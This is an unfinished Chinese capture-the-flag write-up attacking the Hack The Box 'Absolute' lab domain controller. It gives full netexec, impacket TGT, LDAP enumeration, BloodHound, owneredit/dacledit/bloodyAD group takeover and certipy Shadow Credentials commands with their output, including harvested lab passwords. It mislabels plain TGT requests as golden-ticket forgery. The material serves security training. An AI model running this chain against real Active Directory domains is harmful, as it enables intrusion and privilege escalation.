+</span></span><span class="line"><span class="cl">netexec smb 10.10.11.181 -u d.klay -p Darkmoonsky248girl
+</span></span><span class="line"><span class="cl">SMB         10.10.11.181    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.181    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> absolute.htb<span class="se">\d</span>.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION
+</span></span></code></pre></div><p>虽然都失败了，但是注意到smb登录的时候爆出个<code>STATUS_ACCOUNT_RESTRICTION</code>错误，表明该账户受到限制，尝试加上<code>-k</code>参数使用<code>Kerberos</code>认证</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">netexec smb 10.10.11.181 -u d.klay -p Darkmoonsky248girl -k
+</span></span><span class="line"><span class="cl">SMB         10.10.11.181    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.181    <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> absolute.htb<span class="se">\d</span>.klay:Darkmoonsky248girl
+</span></span></code></pre></div><p>将上面失败的命令重新试一下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">netexec ldap 10.10.11.181 -u d.klay -p Darkmoonsky248girl -k
+</span></span><span class="line"><span class="cl">SMB         10.10.11.181    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.181    <span class="m">389</span>    DC               <span class="o">[</span>+<span class="o">]</span> absolute.htb<span class="se">\d</span>.klay:Darkmoonsky248girl
+</span></span></code></pre></div><p>OK，成功</p>
+<p>查看一下smb共享</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">netexec smb 10.10.11.181 -u d.klay -p Darkmoonsky248girl -k --shares
+</span></span><span class="line"><span class="cl">SMB         10.10.11.181    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.181    <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> absolute.htb<span class="se">\d</span>.klay:Darkmoonsky248girl
+</span></span><span class="line"><span class="cl">SMB         10.10.11.181    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Enumerated shares
+</span></span><span class="line"><span class="cl">SMB         10.10.11.181    <span class="m">445</span>    DC               Share           Permissions     Remark
+</span></span><span class="line"><span class="cl">SMB         10.10.11.181    <span class="m">445</span>    DC               -----           -----------     ------
+</span></span><span class="line"><span class="cl">SMB         10.10.11.181    <span class="m">445</span>    DC               ADMIN$                          Remote Admin
+</span></span><span class="line"><span class="cl">SMB         10.10.11.181    <span class="m">445</span>    DC               C$                              Default share
+</span></span><span class="line"><span class="cl">SMB         10.10.11.181    <span class="m">445</span>    DC               IPC$            READ            Remote IPC
+</span></span><span class="line"><span class="cl">SMB         10.10.11.181    <span class="m">445</span>    DC               NETLOGON        READ            Logon server share
+</span></span><span class="line"><span class="cl">SMB         10.10.11.181    <span class="m">445</span>    DC               Shared
+</span></span><span class="line"><span class="cl">SMB         10.10.11.181    <span class="m">445</span>    DC               SYSVOL          READ            Logon server share
+</span></span></code></pre></div><p>注意到有个<code>Shared</code>文件可以访问，但是需要<code>Kerberos</code>认证，只能寻找其他方法了</p>
+<h1 id="tgt黄金票据伪造">
+<a class="header-anchor" href="#tgt%e9%bb%84%e9%87%91%e7%a5%a8%e6%8d%ae%e4%bc%aa%e9%80%a0"></a>
+TGT黄金票据伪造
+</h1><p>由于smb服务需要<code>Kerberos</code>认证，所以我们尝试一下伪造票据来访问smb</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-getTGT <span class="s1">&#39;absolute.htb&#39;</span>/<span class="s1">&#39;d.klay&#39;</span>:<span class="s1">&#39;Darkmoonsky248girl&#39;</span> -dc-ip 10.10.11.181
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in d.klay.ccache
+</span></span></code></pre></div><p>导入票据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>d.klay.ccache
+</span></span></code></pre></div><p>先同步下时间</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ntpdate -s absolute.htb
+</span></span></code></pre></div><p>访问smb</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-smbclient <span class="s1">&#39;absolute.htb/d.klay:Darkmoonsky248girl@dc.absolute.htb&#39;</span> -k -no-pass
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Type <span class="nb">help</span> <span class="k">for</span> list of commands
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span></code></pre></div><p>可以访问smb，但是没有权限查看，尝试通过ldap枚举用户</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">netexec ldap 10.10.11.181 -u d.klay -p <span class="s1">&#39;Darkmoonsky248girl&#39;</span> -k --users
+</span></span><span class="line"><span class="cl">SMB         10.10.11.181    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.181    <span class="m">389</span>    DC               <span class="o">[</span>+<span class="o">]</span> absolute.htb<span class="se">\d</span>.klay:Darkmoonsky248girl
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.181    <span class="m">389</span>    DC               <span class="o">[</span>*<span class="o">]</span> Enumerated <span class="m">17</span> domain users: absolute.htb
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.181    <span class="m">389</span>    DC               -Username-                    -Last PW Set-       -BadPW- -Description-
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.181    <span class="m">389</span>    DC               Administrator                 2022-06-09 08:25:57 <span class="m">0</span>       Built-in account <span class="k">for</span> administering the computer/domain
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.181    <span class="m">389</span>    DC               Guest                         &lt;never&gt;             <span class="m">0</span>       Built-in account <span class="k">for</span> guest access to the computer/domain
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.181    <span class="m">389</span>    DC               krbtgt                        2022-06-09 08:16:38 <span class="m">0</span>       Key Distribution Center Service Account
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.181    <span class="m">389</span>    DC               J.Roberts                     2022-06-09 08:25:51 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.181    <span class="m">389</span>    DC               M.Chaffrey                    2022-06-09 08:25:51 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.181    <span class="m">389</span>    DC               D.Klay                        2022-06-09 08:25:51 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.181    <span class="m">389</span>    DC               s.osvald                      2022-06-09 08:25:51 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.181    <span class="m">389</span>    DC               j.robinson                    2022-06-09 08:25:51 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.181    <span class="m">389</span>    DC               n.smith                       2022-06-09 08:25:51 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.181    <span class="m">389</span>    DC               m.lovegod                     2022-06-09 08:25:51 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.181    <span class="m">389</span>    DC               l.moore                       2022-06-09 08:25:51 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.181    <span class="m">389</span>    DC               c.colt                        2022-06-09 08:25:51 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.181    <span class="m">389</span>    DC               s.johnson                     2022-06-09 08:25:51 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.181    <span class="m">389</span>    DC               d.lemm                        2022-06-09 08:25:51 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.181    <span class="m">389</span>    DC               svc_smb                       2022-06-09 08:25:51 <span class="m">0</span>       AbsoluteSMBService123!
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.181    <span class="m">389</span>    DC               svc_audit                     2022-06-09 08:25:51 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.181    <span class="m">389</span>    DC               winrm_user                    2022-06-09 08:25:51 <span class="m">2</span>       Used to perform simple network tasks
+</span></span></code></pre></div><p>找到一组用户名密码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username: svc_smb
+</span></span><span class="line"><span class="cl">password: AbsoluteSMBService123!
+</span></span></code></pre></div><p>使用<code>nxc</code>验证一下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nxc smb 10.10.11.181 -u svc_smb -p <span class="s1">&#39;AbsoluteSMBService123!&#39;</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.181    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.181    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> absolute.htb<span class="se">\s</span>vc_smb:AbsoluteSMBService123! STATUS_ACCOUNT_RESTRICTION
+</span></span></code></pre></div><p>正常还是访问不了的，继续伪造金票</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-getTGT <span class="s1">&#39;absolute.htb&#39;</span>/<span class="s1">&#39;svc_smb&#39;</span>:<span class="s1">&#39;AbsoluteSMBService123!&#39;</span> -dc-ip 10.10.11.181
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in svc_smb.ccache
+</span></span></code></pre></div><p>导入票据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>svc_smb.ccache
+</span></span></code></pre></div><p>访问smb</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-smbclient <span class="s1">&#39;absolute.htb&#39;</span>/<span class="s1">&#39;svc_smb&#39;</span>:<span class="s1">&#39;AbsoluteSMBService123!&#39;</span>@<span class="s1">&#39;dc.absolute.htb&#39;</span> -k -no-pass
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Type <span class="nb">help</span> <span class="k">for</span> list of commands
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span></code></pre></div><p>访问成功，直接看之前找到的<code>Shared</code>目录</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># shares</span>
+</span></span><span class="line"><span class="cl">ADMIN$
+</span></span><span class="line"><span class="cl">C$
+</span></span><span class="line"><span class="cl">IPC$
+</span></span><span class="line"><span class="cl">NETLOGON
+</span></span><span class="line"><span class="cl">Shared
+</span></span><span class="line"><span class="cl">SYSVOL
+</span></span><span class="line"><span class="cl"><span class="c1"># use shared</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ls</span>
+</span></span><span class="line"><span class="cl">drw-rw-rw-          <span class="m">0</span>  Fri Sep  <span class="m">2</span> 01:02:23 <span class="m">2022</span> .
+</span></span><span class="line"><span class="cl">drw-rw-rw-          <span class="m">0</span>  Fri Sep  <span class="m">2</span> 01:02:23 <span class="m">2022</span> ..
+</span></span><span class="line"><span class="cl">-rw-rw-rw-         <span class="m">72</span>  Fri Sep  <span class="m">2</span> 01:02:23 <span class="m">2022</span> compiler.sh
+</span></span><span class="line"><span class="cl">-rw-rw-rw-      <span class="m">67584</span>  Fri Sep  <span class="m">2</span> 01:02:23 <span class="m">2022</span> test.exe
+</span></span><span class="line"><span class="cl"><span class="c1"># get compiler.sh</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># get test.exe</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span></code></pre></div><p>发现两个文件，下载到本地查看一下</p>
+<h1 id="看不懂的exe">
+<a class="header-anchor" href="#%e7%9c%8b%e4%b8%8d%e6%87%82%e7%9a%84exe"></a>
+看不懂的exe
+</h1><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cat compiler.sh
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nim c -d:mingw --app:gui --cc:gcc -d:danger -d:strip <span class="nv">$1</span>
+</span></span></code></pre></div><p><code>.sh</code>文件没啥有用信息，就编译了一下，重点看下<code>exe</code>文件</p>
+<p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250325170805469-1697634579.png" alt="image-20250325170803915"></p>
+<p>根据这个反汇编程序+GPT得知可能是运行某种服务的程序，尝试在windows上运行并用wireshark抓包</p>
+<p><strong>注：一定要配置DNS，不然抓不到包</strong></p>
+<p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250325174045234-204012456.png" alt="image-20250325174043354"></p>
+<p>使用<code>wireshark</code>监听该网卡，运行程序即可</p>
+<p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250325174146712-308497288.png" alt="image-20250325174144934"></p>
+<p>这就是抓到的全部报文，注意到这其中有一条保温报文显示<code>absolute.htb\mlovegod</code>，追踪一下tcp</p>
+<p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250325174523960-766609021.png" alt="image-20250325174522587"></p>
+<p>发现一组新的用户名密码，结合之前使用 ldap 枚举出的用户名，可以得到该用户名和密码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username: m.lovegod
+</span></span><span class="line"><span class="cl">password: AbsoluteLDAP2022!
+</span></span></code></pre></div><p>验证一下</p>
+<p>依旧是熟悉的伪造金票</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-getTGT <span class="s1">&#39;absolute.htb&#39;</span>/<span class="s1">&#39;m.lovegod&#39;</span>:<span class="s1">&#39;AbsoluteLDAP2022!&#39;</span> -dc-ip 10.10.11.181
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in m.lovegod.ccache
+</span></span></code></pre></div><p>导入票据（<strong>记得同步时间</strong>）</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>m.lovegod.ccache
+</span></span></code></pre></div><p><code>nxc</code>验证</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nxc smb 10.10.11.181 -u <span class="s1">&#39;m.lovegod&#39;</span> -p <span class="s1">&#39;AbsoluteLDAP2022!&#39;</span> -k
+</span></span><span class="line"><span class="cl">SMB         10.10.11.181    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.181    <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> absolute.htb<span class="se">\m</span>.lovegod:AbsoluteLDAP2022!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nxc ldap 10.10.11.181 -u <span class="s1">&#39;m.lovegod&#39;</span> -p <span class="s1">&#39;AbsoluteLDAP2022!&#39;</span> -k
+</span></span><span class="line"><span class="cl">SMB         10.10.11.181    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.181    <span class="m">389</span>    DC               <span class="o">[</span>+<span class="o">]</span> absolute.htb<span class="se">\m</span>.lovegod:AbsoluteLDAP2022!
+</span></span></code></pre></div><p>依旧登陆不了，使用<code>bloodhound</code>信息收集吧</p>
+<h1 id="bloodhound信息收集">
+<a class="header-anchor" href="#bloodhound%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86"></a>
+bloodhound信息收集
+</h1><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bloodhound-python -ns 10.10.11.181 --dns-tcp -d absolute.htb -u m.lovegod -p AbsoluteLDAP2022! -k -c All --zip
+</span></span><span class="line"><span class="cl">INFO: BloodHound.py <span class="k">for</span> BloodHound LEGACY <span class="o">(</span>BloodHound 4.2 and 4.3<span class="o">)</span>
+</span></span><span class="line"><span class="cl">INFO: Found AD domain: absolute.htb
+</span></span><span class="line"><span class="cl">INFO: Using TGT from cache
+</span></span><span class="line"><span class="cl">INFO: Found TGT with correct principal in ccache file.
+</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: dc.absolute.htb
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> domains
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> domains in the forest
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> computers
+</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: dc.absolute.htb
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">18</span> users
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">55</span> groups
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">2</span> gpos
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> ous
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">19</span> containers
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">0</span> trusts
+</span></span><span class="line"><span class="cl">INFO: Starting computer enumeration with <span class="m">10</span> workers
+</span></span><span class="line"><span class="cl">INFO: Querying computer: dc.absolute.htb
+</span></span><span class="line"><span class="cl">INFO: Done in 00M 10S
+</span></span><span class="line"><span class="cl">INFO: Compressing output into 20250326005117_bloodhound.zip
+</span></span></code></pre></div><p>打开bloodhound查看</p>
+<p>以<code>m.lovegod</code>用户为起点，点击<code>Transitive Object Control</code>可以得到如下信息</p>
+<p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250325184717894-575613708.png" alt="image-20250325184715766"></p>
+<p><code>m.lovegod</code> 用户拥有 <code>Network Audit</code> 组，但不是其成员，该组对 <code>winrm_user</code> 用户上有 <code>GenericWrite</code>权限，并且<code>winrm_user</code> 用户属于<code>REMOTE MANAGEMENT USERS</code>组，所以我们可以通过<code>winrm_user</code> 用户远程登陆</p>
+<p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250325185824767-1799036724.png" alt="image-20250325185823379"></p>
+<p>但是我们发现<code>m.lovegod</code> 用户属于图中的三个组并不属于<code>Network Audit</code>组</p>
+<p>所以我们的攻击手法就是先将<code>m.lovegod</code> 用户添加到<code>Network Audit</code>组，再通过<code>Network Audit</code>组对 <code>winrm_user</code> 用户有 <code>GenericWrite</code>权限，可以直接进行<code>Shadow Credentials</code>攻击</p>
+<h1 id="拿下winrm_user">
+<a class="header-anchor" href="#%e6%8b%bf%e4%b8%8bwinrm_user"></a>
+拿下winrm_user？
+</h1><blockquote>
+<p>参考链接：</p>
+<p><a href="https://www.thehacker.recipes/ad/movement/dacl/grant-ownership">https://www.thehacker.recipes/ad/movement/dacl/grant-ownership</a></p>
+<p><a href="https://www.thehacker.recipes/ad/movement/dacl/grant-rights">https://www.thehacker.recipes/ad/movement/dacl/grant-rights</a></p>
+</blockquote>
+<p>先同步时间</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ntpdate -s absolute.htb
+</span></span></code></pre></div><p>将 <code>m.lovegod</code> 用户修改成 <code>Network Audit</code> 组的所有者</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-owneredit -k -no-pass absolute.htb/m.lovegod -dc-ip dc.absolute.htb -new-owner m.lovegod -target <span class="s1">&#39;Network Audit&#39;</span> -action write
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Current owner information below
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> - SID: S-1-5-21-4078382237-1492182817-2568127209-1109
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> - sAMAccountName: m.lovegod
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> - distinguishedName: <span class="nv">CN</span><span class="o">=</span>m.lovegod,CN<span class="o">=</span>Users,DC<span class="o">=</span>absolute,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> OwnerSid modified successfully!
+</span></span></code></pre></div><p>使<code>m.lovegod</code>用户<strong>完全控制</strong> <code>Network Audit</code> 组</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-dacledit -k <span class="s1">&#39;absolute.htb/m.lovegod:AbsoluteLDAP2022!&#39;</span> -dc-ip dc.absolute.htb -principal m.lovegod -target <span class="s2">&#34;Network Audit&#34;</span> -action write -rights FullControl
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> DACL backed up to dacledit-20250326-034031.bak
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> DACL modified successfully!
+</span></span></code></pre></div><p>把<code>m.lovegod</code>自己加入到 <code>Network Audit</code> 组里面</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bloodyAD --host dc.absolute.htb --dc-ip 10.10.11.181 -d <span class="s1">&#39;absolute.htb&#39;</span> -u <span class="s1">&#39;m.lovegod&#39;</span> -p <span class="s1">&#39;AbsoluteLDAP2022!&#39;</span> -k add groupMember <span class="s2">&#34;Network Audit&#34;</span> <span class="s2">&#34;m.lovegod&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> m.lovegod added to Network Audit
+</span></span></code></pre></div><p>加入成功，重新生成一下金票</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-getTGT <span class="s1">&#39;absolute.htb&#39;</span>/<span class="s1">&#39;m.lovegod&#39;</span>:<span class="s1">&#39;AbsoluteLDAP2022!&#39;</span> -dc-ip 10.10.11.181
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>m.lovegod.ccache
+</span></span></code></pre></div><p>对用户 <code>winrm_user</code> 执行 <code>Shadow Credentials</code> 攻击</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">certipy-ad shadow auto -k -username m.lovegod@absolute.htb -p <span class="s1">&#39;AbsoluteLDAP2022!&#39;</span> -account winrm_user -target dc.absolute.htb -dc-ip 10.10.11.181
+</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Targeting user <span class="s1">&#39;winrm_user&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Generating certificate
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Certificate generated
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Generating Key Credential
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Key Credential generated with DeviceID <span class="s1">&#39;22e415af-e00b-59e5-9462-693c3948067e&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Adding Key Credential with device ID <span class="s1">&#39;22e415af-e00b-59e5-9462-693c3948067e&#39;</span> to the Key Credentials <span class="k">for</span> <span class="s1">&#39;winrm_user&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Successfully added Key Credential with device ID <span class="s1">&#39;22e415af-e00b-59e5-9462-693c3948067e&#39;</span> to the Key Credentials <span class="k">for</span> <span class="s1">&#39;winrm_user&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Authenticating as <span class="s1">&#39;winrm_user&#39;</span> with the certificate
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using principal: winrm_user@absolute.htb
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to get TGT...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Got error <span class="k">while</span> trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP<span class="o">(</span>KDC has no support <span class="k">for</span> padata <span class="nb">type</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Restoring the old Key Credentials <span class="k">for</span> <span class="s1">&#39;winrm_user&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Successfully restored the old Key Credentials <span class="k">for</span> <span class="s1">&#39;winrm_user&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NT <span class="nb">hash</span> <span class="k">for</span> <span class="s1">&#39;winrm_user&#39;</span>: None
+</span></span></code></pre></div><p>不出意外的话还是出意外了，请求<code>TGT</code>的时候出问题了</p>
+<p>还是看下报错吧，熟悉的<code>KDC_ERR_PADATA_TYPE_NOSUPP</code>错误，猜测是因为机器的<code>PKINIT</code>过期了，所以 <code>Shadow Credentials</code> 攻击是不行的</p>
+<h1 id="待更新">
+<a class="header-anchor" href="#%e5%be%85%e6%9b%b4%e6%96%b0"></a>
+待更新
+</h1><p>试了挺多办法都失败了，先到这吧。。。</p></div>
